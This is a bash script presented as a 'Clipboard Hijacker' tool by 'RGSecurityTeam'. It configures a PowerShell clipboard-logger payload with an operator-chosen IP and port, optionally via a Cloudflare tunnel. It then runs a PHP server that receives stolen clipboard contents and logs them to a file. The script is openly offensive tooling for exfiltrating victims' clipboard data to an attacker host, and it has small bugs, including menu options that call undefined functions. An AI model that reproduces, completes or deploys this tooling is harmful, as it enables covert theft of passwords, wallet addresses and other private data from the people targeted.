#!/bin/bash
# RGSecurityTeam - Clipboard Hijacker
# YouTube: www.youtube.com/@RGSecurityTeam

version="0.1"

# ANSI colors
red="$(printf '\033[1;31m')"  
green="$(printf '\033[1;32m')"  
orange="$(printf '\033[1;93m')"
blue="$(printf '\033[1;34m')" 
cyan="$(printf '\033[1;36m')"  
white="$(printf '\033[1;37m')" 
redbg="$(printf '\033[1;41m')"
nc="$(printf '\e[0m')" #no color

## Script Dir
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

## kill process
kill_pid(){
    checkphp=$(ps aux | grep -o "php" | head -n1)
    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
}

## Clear logs files
if [ -e "clipboard_logger.ps1" ]; then
rm clipboard_logger.ps1
fi

## capture program terminate
terminate() {
    echo -e "\n\n${red}[!] Program terminated.${nc}"
    pkill -f "php -S" 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    exit 0
}

trap terminate INT

## BANNER 
banner() {
echo -e "\n"
echo -e "${cyan}    ███████${orange}╗${cyan} █████${orange}╗ ${cyan}██${orange}╗${cyan}      ██████${orange}╗ ${cyan}██████${orange}╗${cyan} ███${orange}╗${cyan}   ██${orange}╗ ${nc}"
echo -e "${cyan}    ██${orange}╔════╝${cyan}██${orange}╔══${cyan}██${orange}╗${cyan}██${orange}║     ${cyan}██${orange}╔════╝${cyan}██${orange}╔═══${cyan}██${orange}╗${cyan}████${orange}╗  ${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    █████${orange}╗  ${cyan}███████${orange}║${cyan}██$orange║     ${cyan}██${orange}║     ${cyan}██${orange}║   ${cyan}██${orange}║${cyan}██$orange╔${cyan}██${orange}╗ ${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    ██${orange}╔══╝  ${cyan}██${orange}╔══${cyan}██${orange}║${cyan}██${orange}║     ${cyan}██${orange}║     ${cyan}██${orange}║   ${cyan}██$orange║${cyan}██${orange}║╚${cyan}██${orange}╗${cyan}██${orange}║ ${nc}"
echo -e "${cyan}    ██${orange}║     ${cyan}██${orange}║  ${cyan}██${orange}║${cyan}███████${orange}╗╚${cyan}██████${orange}╗╚${cyan}██████${orange}╔╝${cyan}██$orange║ ╚${cyan}████${orange}║ ${nc}"
echo -e "${orange}    ╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ "
echo -e "${white}${green}    Clip Board Hijacker by ${redbg}${white}RGSecurityTeam.${nc}${white} Version:$version ${nc}"
}



## Setup Server
manual_server(){
    { clear; banner; echo; }
    echo -e "${orange}═════════ ${blue}Falcon Started${orange} ═════════\n"
    echo -e "${cyan}[${red}+${cyan}]${white} Server running on${blue} http://$IP:$PORT"
    echo -e "${cyan}[${red}+${cyan}]${white} Log file: ${blue}${SCRIPT_DIR}/.server/clipboard_log.txt${nc}\n"
    echo -e "${cyan}[${red}+${cyan}]${white} Waiting for clipboard data...${orange} (Ctrl+C to stop)${nc}\n"

    php -F .server/clipboard-reciver.php -S "$IP:$PORT" > /dev/null 2>&1 &
    tail -f .server/clipboard_log.txt
    local tail_pid=$!

    trap "kill $tail_pid 2>/dev/null; " INT
}

## Manually setup
manual_setup(){
    { clear; banner; echo; }
    echo -e "${orange}═════════ ${blue}payload setup${orange} ═════════\n"
    read -p "${red}[${orange}+${red}]${white} Enter IP Address: " IP
    read -p "${red}[${orange}+${red}]${white} Enter Port Number: " PORT

    sed -i "s/^\$ip = .*/\$ip = \"$IP\"/" .templates/clipboard_logger.ps1
    sed -i "s/^\$port = .*/\$port = \"$PORT\"/" .templates/clipboard_logger.ps1
    echo -e "\n${cyan}[${red}+${cyan}]${white} Payload Cinfigured for${blue} http://$IP:$PORT\n"
    cp .templates/clipboard_logger.ps1 "$SCRIPT_DIR"
    manual_server
}

## Main Function
main_falcon(){
    { clear; banner; echo; }
    echo -e "${orange}═════════ ${blue}Main Menu${orange} ═════════\n"
    echo -e "${red}[${orange}01${red}]${white} Setup With Manual IP & PORT"
    echo -e "${red}[${orange}02${red}]${white} Setup With Manual Cloudflare"
    echo -e "${red}[${orange}03${red}]${white} Help Menu"
    echo -e "${red}[${orange}04${red}]${green} Exit\n"

    read -p "${cyan}[${red}+${cyan}]${white} Select option: ${blue}" choice

    case $choice in
        1 | 01)
            manual_setup;;
        2 | 03)
            cloudf_setup;;
        3 | 03)
            help_menu;;
        4 | 04)
            exit_msg;;
        *)
            echo -e "\n\n${red}[${orange}!${red}] Invalid option... Try Again!${nc}"; sleep 1.5; main_falcon;;
    esac
}

kill_pid
main_falcon